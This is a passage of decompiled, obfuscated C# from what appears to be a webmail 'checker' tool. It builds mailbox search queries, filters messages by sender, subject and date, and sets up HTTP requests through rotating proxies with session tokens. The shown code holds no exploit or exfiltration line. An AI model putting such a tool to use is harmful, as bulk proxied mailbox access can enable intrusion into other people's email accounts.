					if (SearchSettings.Instance.DateTo != null)
					{
						stringBuilder.Append(<Module>.smethod_4<string>(159789737) + SearchSettings.Instance.DateTo.Value.ToString(<Module>.smethod_6<string>(-1161835433)) + <Module>.smethod_4<string>(1912641355));
					}
				}
			}
			else
			{
				if (request.DateFrom != null)
				{
					stringBuilder.Append(<Module>.smethod_5<string>(-1015164236) + request.DateFrom.Value.ToString(<Module>.smethod_2<string>(-187461536)) + <Module>.smethod_6<string>(-239347711));
				}
				if (request.DateTo != null)
				{
					stringBuilder.Append(<Module>.smethod_3<string>(-843387492) + request.DateTo.Value.ToString(<Module>.smethod_5<string>(1908418633)) + <Module>.smethod_4<string>(1912641355));
				}
			}
			if (request.Body != null)
			{
				stringBuilder.Append(request.Body);
			}
			return stringBuilder.ToString().Trim(new char[]
			{
				' '
			});
		}

		// Token: 0x0600060C RID: 1548 RVA: 0x0002918C File Offset: 0x0002738C
		private bool Validate(Request request, string from, string subject, DateTime date)
		{
			if (request.Sender != null && !from.ContainsIgnoreCase(request.Sender))
			{
				return false;
			}
			if (request.Subject != null && !subject.ContainsIgnoreCase(request.Subject))
			{
				return false;
			}
			if (!request.CheckDate)
			{
				if (SearchSettings.Instance.CheckDate)
				{
					if (SearchSettings.Instance.DateFrom != null && date < SearchSettings.Instance.DateFrom.Value)
					{
						return false;
					}
					if (SearchSettings.Instance.DateTo != null && date > SearchSettings.Instance.DateTo.Value.AddDays(1.0))
					{
						return false;
					}
				}
			}
			else
			{
				if (request.DateFrom != null && date < request.DateFrom.Value)
				{
					return false;
				}
				if (request.DateTo != null && date > request.DateTo.Value.AddDays(1.0))
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x0600060D RID: 1549 RVA: 0x0002B404 File Offset: 0x00029604
		private void Reset()
		{
			HttpRequest httpRequest = this._httpRequest;
			if (httpRequest != null)
			{
				httpRequest.Close();
			}
			this._httpRequest = new HttpRequest
			{
				ConnectTimeout = CheckerSettings.Instance.Timeout * 1000,
				ReadWriteTimeout = CheckerSettings.Instance.Timeout * 1000,
				Cookies = new CookieDictionary(false),
				IgnoreProtocolErrors = true,
				AllowAutoRedirect = false,
				KeepAlive = false,
				Reconnect = false,
				ReconnectLimit = 2,
				UserAgent = <Module>.smethod_5<string>(-1517859541)
			};
			if (ProxySettings.Instance.UseProxy)
			{
				this._httpRequest.Proxy = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x0600060E RID: 1550 RVA: 0x00009B57 File Offset: 0x00007D57
		private bool IsAboveLimit(int count)
		{
			return !SearchSettings.Instance.UseSearchLimit || count >= SearchSettings.Instance.SearchLimit;
		}

		// Token: 0x0600060F RID: 1551 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x04000324 RID: 804
		private Mailbox _mailbox;

		// Token: 0x04000325 RID: 805
		private HttpRequest _httpRequest;

		// Token: 0x04000326 RID: 806
		private string _crumb;

		// Token: 0x04000327 RID: 807
		private string _acrumb;

		// Token: 0x04000328 RID: 808
		private string _sessionIndex;

		// Token: 0x04000329 RID: 809
		private string _wssid;

		// Token: 0x0400032A RID: 810
		private string _mailboxId;

		// Token: 0x0400032B RID: 811
		private static string _siteKey;
	}
}
